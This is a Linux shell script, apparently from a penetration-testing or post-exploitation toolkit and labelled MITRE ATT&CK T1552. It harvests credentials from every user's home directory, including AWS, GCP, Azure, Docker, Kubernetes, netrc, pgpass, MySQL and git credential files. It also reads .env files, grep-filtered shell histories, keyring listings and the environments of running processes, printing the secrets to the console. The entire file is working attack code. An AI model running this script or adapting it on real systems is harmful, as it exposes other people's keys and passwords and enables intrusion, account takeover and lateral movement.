#!/bin/sh
# gather/linux/enum-credentials.sh — Harvest credentials from common locations
# Requires: read access to user home directories and /etc
# Read-only: YES
# MITRE ATT&CK: T1552 — Unsecured Credentials

echo "=== AWS CREDENTIALS ==="
cut -d: -f6 /etc/passwd 2>/dev/null | sort -u | while IFS= read -r d; do
  for f in .aws/credentials .aws/config .s3cfg .boto; do
    [ -f "$d/$f" ] || continue
    echo "--- $d/$f ---"
    cat "$d/$f" 2>/dev/null
  done
done

echo ""
echo "=== GCP / AZURE ==="
cut -d: -f6 /etc/passwd 2>/dev/null | sort -u | while IFS= read -r d; do
  # GCP service account keys
  [ -d "$d/.config/gcloud" ] && echo "--- $d/.config/gcloud ---" && find "$d/.config/gcloud" -name "*.json" -exec echo "  {}" \; -exec cat {} \; 2>/dev/null
  # Azure CLI
  [ -f "$d/.azure/accessTokens.json" ] && echo "--- $d/.azure/accessTokens.json ---" && cat "$d/.azure/accessTokens.json" 2>/dev/null
  [ -f "$d/.azure/azureProfile.json" ] && echo "--- $d/.azure/azureProfile.json ---" && cat "$d/.azure/azureProfile.json" 2>/dev/null
done

echo ""
echo "=== DOCKER CREDENTIALS ==="
cut -d: -f6 /etc/passwd 2>/dev/null | sort -u | while IFS= read -r d; do
  [ -f "$d/.docker/config.json" ] || continue
  echo "--- $d/.docker/config.json ---"
  cat "$d/.docker/config.json" 2>/dev/null
done

echo ""
echo "=== KUBERNETES ==="
cut -d: -f6 /etc/passwd 2>/dev/null | sort -u | while IFS= read -r d; do
  [ -f "$d/.kube/config" ] || continue
  echo "--- $d/.kube/config ---"
  cat "$d/.kube/config" 2>/dev/null
done

echo ""
echo "=== NETRC / PGPASS / MY.CNF ==="
cut -d: -f6 /etc/passwd 2>/dev/null | sort -u | while IFS= read -r d; do
  [ -f "$d/.netrc" ] && echo "--- $d/.netrc ---" && cat "$d/.netrc" 2>/dev/null
  [ -f "$d/.pgpass" ] && echo "--- $d/.pgpass ---" && cat "$d/.pgpass" 2>/dev/null
  [ -f "$d/.my.cnf" ] && echo "--- $d/.my.cnf ---" && cat "$d/.my.cnf" 2>/dev/null
done

echo ""
echo "=== GIT CREDENTIALS ==="
cut -d: -f6 /etc/passwd 2>/dev/null | sort -u | while IFS= read -r d; do
  [ -f "$d/.git-credentials" ] && echo "--- $d/.git-credentials ---" && cat "$d/.git-credentials" 2>/dev/null
  [ -f "$d/.gitconfig" ] && grep -i "credential\|token\|password" "$d/.gitconfig" 2>/dev/null && echo "--- $d/.gitconfig (filtered) ---"
done

echo ""
echo "=== ENVIRONMENT FILES ==="
cat /etc/environment 2>/dev/null | grep -iE "key|secret|token|pass|cred" && echo "--- /etc/environment (filtered) ---"
find / -maxdepth 3 -name ".env" -type f 2>/dev/null | grep -v "/proc/" | grep -v "/sys/" | while IFS= read -r f; do
  echo "--- $f ---"
  cat "$f" 2>/dev/null
done

echo ""
echo "=== HISTORY FILES (last 30 lines with secrets) ==="
cut -d: -f6 /etc/passwd 2>/dev/null | sort -u | while IFS= read -r d; do
  for f in .bash_history .zsh_history .sh_history; do
    [ -f "$d/$f" ] || continue
    hits=$(grep -inE "pass|secret|token|key|curl.*-u|wget.*--password|mysql.*-p|sshpass" "$d/$f" 2>/dev/null | tail -30)
    [ -n "$hits" ] && echo "--- $d/$f (secrets) ---" && echo "$hits"
  done
done

echo ""
echo "=== VAULT / GNOME KEYRING ==="
cut -d: -f6 /etc/passwd 2>/dev/null | sort -u | while IFS= read -r d; do
  [ -d "$d/.local/share/keyrings" ] && echo "--- $d keyrings ---" && ls -la "$d/.local/share/keyrings/" 2>/dev/null
done

echo ""
echo "=== PROCESS ENVIRONMENT (secrets in running procs) ==="
find /proc/*/environ -readable 2>/dev/null | while IFS= read -r f; do
  pid=$(echo "$f" | cut -d/ -f3)
  content=$(tr '\0' '\n' < "$f" 2>/dev/null | grep -iE "pass|secret|token|key|api" | grep -v "^PATH=")
  [ -n "$content" ] && echo "--- PID $pid ($(cat /proc/$pid/comm 2>/dev/null)) ---" && echo "$content"
done
